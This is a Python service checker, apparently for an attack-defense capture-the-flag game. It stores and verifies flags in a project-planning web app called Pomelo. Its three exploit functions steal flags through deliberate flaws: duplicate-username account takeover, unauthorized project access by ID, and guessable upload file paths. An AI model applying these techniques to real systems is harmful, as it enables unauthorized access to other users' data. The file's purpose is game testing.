import io
import json
from dataclasses import dataclass
from datetime import datetime, timedelta, timezone
from logging import LoggerAdapter
from typing import List, Optional, Tuple

from dataclasses_json import LetterCase, dataclass_json
from enochecker3 import ChainDB, Enochecker, ExploitCheckerTaskMessage, GetflagCheckerTaskMessage, MumbleException, PutflagCheckerTaskMessage
from enochecker3.types import OfflineException
from enochecker3.utils import FlagSearcher, assert_equals
from faker import Faker
from httpx import AsyncClient, RequestError

faker = Faker()
checker = Enochecker("Pomelo", 5000)
app = lambda: checker.app
COOKIE_NAME = ".AspNetCore.Cookies"


@dataclass_json(letter_case=LetterCase.CAMEL)
@dataclass
class EmployeeDto:
    id: int
    name: str
    note: Optional[str]


@dataclass_json(letter_case=LetterCase.CAMEL)
@dataclass
class EmployeeProjectHoursDto:
    employee_id: int
    project_id: int
    total_hours: int
    delivered_hours: int


@dataclass_json(letter_case=LetterCase.CAMEL)
@dataclass
class EmployeeProjectWeeklyCapacityDto:
    employee_id: int
    project_id: int
    start: str
    capacity: int


@dataclass_json(letter_case=LetterCase.CAMEL)
@dataclass
class ProjectDto:
    id: int
    name: str
    begin: str
    end: str
    delivered_hours_timestamp: str
    employee_project_hours: List[EmployeeProjectHoursDto]
    employee_project_weekly_capacities: List[EmployeeProjectWeeklyCapacityDto]


@dataclass_json(letter_case=LetterCase.CAMEL)
@dataclass
class ProjectInfoDto:
    id: int
    name: str
    begin: str
    end: str
    delivered_hours_timestamp: str


@dataclass_json(letter_case=LetterCase.CAMEL)
@dataclass
class EmployeeDetailsDto:
    id: int
    name: str
    note: Optional[str]
    employee_project_hours: List[EmployeeProjectHoursDto]
    employee_project_weekly_capacities: List[EmployeeProjectWeeklyCapacityDto]


def create_user_name() -> str:
    return faker.name() + faker.md5(raw_output=False)


def create_department_name() -> str:
    return faker.bs() + faker.md5(raw_output=False)


def create_project_name() -> str:
    return faker.catch_phrase()


def create_user_agent() -> str:
    return faker.user_agent()


def create_project_begin() -> str:
    utcnow = datetime.utcnow()
    d = datetime(utcnow.year, utcnow.month - 1, utcnow.day, 0, 0, 0, 0, timezone.utc)
    return d.strftime("%Y-%m-%dT%H:%M:%S.%fZ")


def create_project_end() -> str:
    utcnow = datetime.utcnow()
    d = datetime(utcnow.year, utcnow.month + 1, utcnow.day, 0, 0, 0, 0, timezone.utc)
    return d.strftime("%Y-%m-%dT%H:%M:%S.%fZ")


def create_capacity_date() -> str:
    utcnow = datetime.utcnow()
    d = datetime(utcnow.year, utcnow.month, utcnow.day, 0, 0, 0, 0, timezone.utc)
    d = d + timedelta(days=-d.weekday(), weeks=1)
    return d.strftime("%Y-%m-%dT%H:%M:%S.%fZ")


def get_user_agent() -> str:
    return faker.user_agent()


async def test_connectivity(client: AsyncClient, logger: LoggerAdapter) -> None:
    try:
        logger.debug(f"test_connectivity()")
        headers = {"User-Agent": get_user_agent()}
        await client.get("/", headers=headers)
    except:
        raise OfflineException()


async def register_user(client: AsyncClient, employeeName: str, department: str, note: Optional[str], logger: LoggerAdapter) -> Tuple[EmployeeDto, str]:
    try:
        logger.debug(f"register_user({employeeName}, {department}")
        headers = {"User-Agent": get_user_agent()}
        response = await client.post("/api/account/register", data={"employeeName": employeeName, "department": department, "note": note}, headers=headers)
        logger.debug(f"{response.status_code} {response.text}")
    except RequestError:
        raise MumbleException("/api/account/register request error")
    assert_equals(response.status_code, 200, "POST /api/account/register failed")

    try:
        cookie = response.cookies[COOKIE_NAME]
    except:
        raise MumbleException("POST /api/account/register did not set cookie")

    try:
        account = EmployeeDto.from_json(response.text)  # type: ignore
    except:
        raise MumbleException("GET /api/account/register returned unexpected data")
    return (account, cookie)


async def get_account(client: AsyncClient, logger: LoggerAdapter) -> EmployeeDto:
    try:
        logger.debug("get_account()")
        headers = {"User-Agent": get_user_agent()}
        response = await client.get("/api/account/account", headers=headers)
        logger.debug(f"{response.status_code} {response.text}")
    except RequestError:
        raise MumbleException("/api/account/account request error")

    assert_equals(response.status_code, 200, "GET /api/account/account failed")

    try:
        account = EmployeeDto.from_json(response.text)  # type: ignore
    except:
        raise MumbleException("GET /api/account/account returned unexpected data")

    return account


async def get_employee(client: AsyncClient, id: int, logger: LoggerAdapter) -> EmployeeDetailsDto:
    try:
        logger.debug(f"get_employee({id})")
        headers = {"User-Agent": get_user_agent()}
        response = await client.get(f"/api/account/employee?employeeId={id}", headers=headers)
        logger.debug(f"{response.status_code} {response.text}")
    except RequestError:
        raise MumbleException("/api/account/employee request error")

    assert_equals(response.status_code, 200, "GET /api/account/employee failed")

    try:
        account = EmployeeDetailsDto.from_json(response.text)  # type: ignore
    except:
        raise MumbleException("GET /api/account/employee returned unexpected data")

    return account


async def update_note(client: AsyncClient, note: str, logger: LoggerAdapter) -> EmployeeDto:
    try:
        logger.debug(f"update_note({note})")
        headers = {"User-Agent": get_user_agent()}
        response = await client.post("/api/account/note", data={"note": note}, headers=headers)
        logger.debug(f"{response.status_code} {response.text}")
    except RequestError:
        raise MumbleException("/api/account/note request error")
    assert_equals(response.status_code, 200, "POST /api/account/note failed")

    try:
        account = EmployeeDto.from_json(response.text)  # type: ignore
    except:
        raise MumbleException("POST /api/account/note returned unexpected data")

    return account


async def create_project(client: AsyncClient, name: str, begin: str, end: str, logger: LoggerAdapter) -> ProjectDto:
    try:
        logger.debug(f"create_project({name}, {begin}, {end})")
        headers = {"User-Agent": get_user_agent()}
        response = await client.post("/api/project/project", data={"name": name, "begin": begin, "end": end}, headers=headers)
        logger.debug(f"{response.status_code} {response.text}")
    except RequestError:
        raise MumbleException("/api/project/project request error")
    assert_equals(response.status_code, 200, "POST /api/project/project failed")

    try:
        account = ProjectDto.from_json(response.text)  # type: ignore
    except:
        raise MumbleException("POST /api/project/project returned unexpected data")

    return account


async def get_project(client: AsyncClient, id: int, logger: LoggerAdapter) -> ProjectDto:
    try:
        logger.debug(f"get_project({id})")
        headers = {"User-Agent": get_user_agent()}
        response = await client.get(f"/api/project/project?projectId={id}", headers=headers)
        logger.debug(f"{response.status_code} {response.text}")
    except RequestError:
        raise MumbleException("/api/project/project request error")

    assert_equals(response.status_code, 200, "GET /api/project/project failed")

    try:
        project = ProjectDto.from_json(response.text)  # type: ignore
    except:
        raise MumbleException("GET /api/project/project returned unexpected data")

    return project


async def get_projects(client: AsyncClient, id: int, logger: LoggerAdapter) -> List[ProjectInfoDto]:
    try:
        logger.debug(f"get_project({id})")
        headers = {"User-Agent": get_user_agent()}
        response = await client.get(f"/api/project/projects?projectId={id}", headers=headers)
        logger.debug(f"{response.status_code} {response.text}")
    except RequestError:
        raise MumbleException("/api/project/projects request error")

    assert_equals(response.status_code, 200, "GET /api/project/projects failed")

    try:
        projects = ProjectInfoDto.schema().loads(response.text, many=True)  # type: ignore
    except:
        raise MumbleException("GET /api/project/projects returned unexpected data")

    return projects


async def set_hours(client: AsyncClient, employee_id: int, project_id: int, hours: int, logger: LoggerAdapter) -> ProjectDto:
    try:
        headers = {"User-Agent": get_user_agent()}
        response = await client.post("/api/project/hours", data={"employeeId": employee_id, "projectId": project_id, "hours": hours}, headers=headers)
        logger.debug(f"{response.status_code} {response.text}")
    except RequestError:
        raise MumbleException("/api/project/capacity request error")
    assert_equals(response.status_code, 200, "POST /api/project/capacity failed")

    try:
        project = ProjectDto.from_json(response.text)  # type: ignore
    except:
        raise MumbleException("POST /api/project/capacity returned unexpected data")

    return project


async def set_capacity(client: AsyncClient, employee_id: int, project_id: int, start: str, capacity: int, logger: LoggerAdapter) -> None:
    try:
        headers = {"User-Agent": get_user_agent()}
        response = await client.post(
            "/api/project/capacity", data={"employeeId": employee_id, "projectId": project_id, "start": start, "capacity": capacity}, headers=headers
        )
        logger.debug(f"{response.status_code} {response.text}")
    except RequestError:
        raise MumbleException("/api/project/capacity request error")
    assert_equals(response.status_code, 204, "POST /api/project/capacity failed")


async def upload_booking(client: AsyncClient, project_id: int, file: str, logger: LoggerAdapter) -> str:
    try:
        headers = {"User-Agent": get_user_agent()}
        response = await client.post(f"/api/booking/upload?projectId={project_id}", files={"file": io.StringIO(file)}, headers=headers)
        logger.debug(f"{response.status_code} {response.text}")
    except RequestError:
        raise MumbleException("/api/booking/upload request error")
    assert_equals(response.status_code, 200, "POST /api/booking/upload failed")
    return response.text


async def download_booking(client: AsyncClient, url: str, logger: LoggerAdapter) -> str:
    try:
        headers = {"User-Agent": get_user_agent()}
        response = await client.get(url, headers=headers)
        logger.debug(f"{response.status_code} {response.text}")
    except RequestError:
        raise MumbleException("GET booking request error")
    assert_equals(response.status_code, 200, "GET booking failed")
    return response.text


@checker.putflag(0)
async def putflag_user_note(task: PutflagCheckerTaskMessage, session0: AsyncClient, session1: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> str:
    await test_connectivity(session0, logger)
    username0 = create_user_name()
    department = create_department_name()
    project_name = create_project_name()
    (employee0, cookie0) = await register_user(session0, username0, department, task.flag, logger)
    assert_equals(task.flag, employee0.note, "Could not find flag in note")
    project = await create_project(session0, project_name, create_project_begin(), create_project_end(), logger)
    await db.set("cookie0", cookie0)
    await db.set("employeeId", employee0.id)
    await db.set("department", department)
    await db.set("projectName", project_name)

    username1 = create_user_name()
    (employee1, cookie1) = await register_user(session1, username1, department, task.flag, logger)
    flag_employee = await get_employee(session1, employee0.id, logger)
    assert_equals(task.flag, flag_employee.note, "Could not find flag in note")
    await set_hours(session0, employee1.id, project.id, 100, logger)
    await set_hours(session1, employee0.id, project.id, 100, logger)
    await set_capacity(session0, employee0.id, project.id, create_capacity_date(), 10, logger)
    await set_capacity(session1, employee1.id, project.id, create_capacity_date(), 10, logger)

    return json.dumps({"username": username0, "projectId": project.id,})


@checker.getflag(0)
async def getflag_user_note(task: GetflagCheckerTaskMessage, session0: AsyncClient, session1: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    await test_connectivity(session0, logger)
    try:
        cookie0 = await db.get("cookie0")
        employee_id = await db.get("employeeId")
        department = await db.get("department")
    except KeyError:
        raise MumbleException("Missing results from putflag")

    session0.cookies.set(COOKIE_NAME, cookie0)
    account = await get_account(session0, logger)
    assert_equals(task.flag, account.note, "Could not find flag in user note")

    username2 = create_user_name()
    (employee2, cookie2) = await register_user(session1, username2, department, task.flag, logger)
    flag_employee = await get_employee(session1, employee_id, logger)
    assert_equals(task.flag, flag_employee.note, "Could not find flag in note")

    eph = False
    for e1 in flag_employee.employee_project_hours:
        if e1.employee_id == employee_id:
            eph = True
    if not eph:
        raise MumbleException("Planned hours are missing")

    wpch = False
    for e2 in flag_employee.employee_project_weekly_capacities:
        if e2.employee_id == employee_id:
            wpch = True
    if not wpch:
        raise MumbleException("Capacities are missing")


@checker.putflag(1)
async def putflag_project_name(task: PutflagCheckerTaskMessage, session0: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> str:
    await test_connectivity(session0, logger)
    username0 = create_user_name()
    department = create_department_name()
    (employee0, cookie0) = await register_user(session0, username0, department, None, logger)
    await db.set("cookie0", cookie0)
    await db.set("department", department)
    await db.set("employeeId", employee0.id)

    begin = create_project_begin()
    end = create_project_end()
    project = await create_project(session0, task.flag, begin, end, logger)
    await db.set("projectId", project.id)
    assert_equals(task.flag, project.name, "Could not find flag in project name")

    await set_hours(session0, employee0.id, project.id, 100, logger)
    await set_capacity(session0, employee0.id, project.id, create_capacity_date(), 10, logger)

    projects = await get_projects(session0, project.id, logger)
    found = False
    for p in projects:
        if p.name == task.flag:
            found = True
            break

    if not found:
        raise MumbleException("Could not find flag in project name")

    return json.dumps({"username": username0, "projectId": project.id,})


@checker.getflag(1)
async def getflag_project_name(task: GetflagCheckerTaskMessage, session0: AsyncClient, session1: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    await test_connectivity(session0, logger)
    try:
        cookie0 = await db.get("cookie0")
        employee_id = await db.get("employeeId")
        department = await db.get("department")
        project_id = await db.get("projectId")
    except KeyError:
        raise MumbleException("Missing results from putflag")

    session0.cookies.set(COOKIE_NAME, cookie0)
    # TODO assert project is still in department?

    project = await get_project(session0, project_id, logger)
    assert_equals(task.flag, project.name, "Could not find flag in project name")

    username1 = create_user_name()
    (employee1, cookie1) = await register_user(session1, username1, department, task.flag, logger)
    project1 = await get_project(session1, project_id, logger)
    assert_equals(task.flag, project1.name, "Could not find flag in project name")

    flag_employee = await get_employee(session1, employee_id, logger)
    eph = False
    for e1 in flag_employee.employee_project_hours:
        if e1.employee_id == employee_id:
            eph = True
    if not eph:
        raise MumbleException("Planned hours are missing")

    wpch = False
    for e2 in flag_employee.employee_project_weekly_capacities:
        if e2.employee_id == employee_id:
            wpch = True
    if not wpch:
        raise MumbleException("Capacities are missing")

    peph = False
    for pe1 in project1.employee_project_hours:
        if pe1.employee_id == employee_id:
            peph = True
    if not peph:
        raise MumbleException("Planned hours are missing")

    pwpch = False
    for pe2 in project1.employee_project_weekly_capacities:
        if pe2.employee_id == employee_id:
            pwpch = True
    if not pwpch:
        raise MumbleException("Capacities are missing")

    fetched_project = await set_hours(session1, employee1.id, project_id, 100, logger)
    assert_equals(task.flag, fetched_project.name, "Could not find flag in project name")


@checker.putflag(2)
async def putflag_booking(task: PutflagCheckerTaskMessage, session0: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> str:
    await test_connectivity(session0, logger)
    username0 = create_user_name()
    department = create_department_name()
    (employee0, cookie0) = await register_user(session0, username0, department, None, logger)
    await db.set("cookie0", cookie0)
    await db.set("department", department)

    begin = create_project_begin()
    end = create_project_end()
    project = await create_project(session0, task.flag, begin, end, logger)
    await db.set("projectId", project.id)

    await set_hours(session0, employee0.id, project.id, 100, logger)
    await set_capacity(session0, employee0.id, project.id, create_capacity_date(), 10, logger)

    booking_url = await upload_booking(session0, project.id, f"{task.flag}\n{employee0.id},20", logger)
    await db.set("bookingUrl", booking_url)

    return json.dumps({"username": username0, "projectId": project.id,})


@checker.getflag(2)
async def getflag_booking(task: GetflagCheckerTaskMessage, session0: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    await test_connectivity(session0, logger)
    try:
        booking_url = await db.get("bookingUrl")
    except KeyError:
        raise MumbleException("Missing results from putflag")

    # TODO assert project is still in department?

    booking = await download_booking(session0, booking_url, logger)
    assert_equals(booking.split("\n")[0], task.flag, "Could not find booking file")


@checker.exploit(0)
async def exploit_user_note(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient, logger: LoggerAdapter) -> Optional[str]:
    username = json.loads(task.attack_info)["username"]  # type: ignore
    department = faker.bs()

    (employee, cookie) = await register_user(client, username, department, None, logger)
    account = await update_note(client, "foo", logger)

    flag = searcher.search_flag(account.note)  # type: ignore
    if flag:
        return flag.decode()

    raise MumbleException("exploit failed")


@checker.exploit(1)
async def exploit_project_name(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient, logger: LoggerAdapter) -> Optional[str]:
    project_id = json.loads(task.attack_info)["projectId"]  # type: ignore

    (employee, _cookie) = await register_user(client, "Kevin", "Penispumpenshop24.de", None, logger)
    project = await set_hours(client, employee.id, project_id, 0, logger)

    flag = searcher.search_flag(project.name)
    if flag:
        return flag.decode()

    raise MumbleException("exploit failed")


@checker.exploit(2)
async def exploit_booking_file(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient, logger: LoggerAdapter) -> Optional[str]:
    project_id = json.loads(task.attack_info)["projectId"]  # type: ignore

    booking = await download_booking(client, f"/Uploads/{project_id}_00000000-0000-0000-0000-000000000000.csv", logger)

    flag = searcher.search_flag(booking)
    if flag:
        return flag.decode()

    raise MumbleException("exploit failed")


if __name__ == "__main__":
    checker.run()
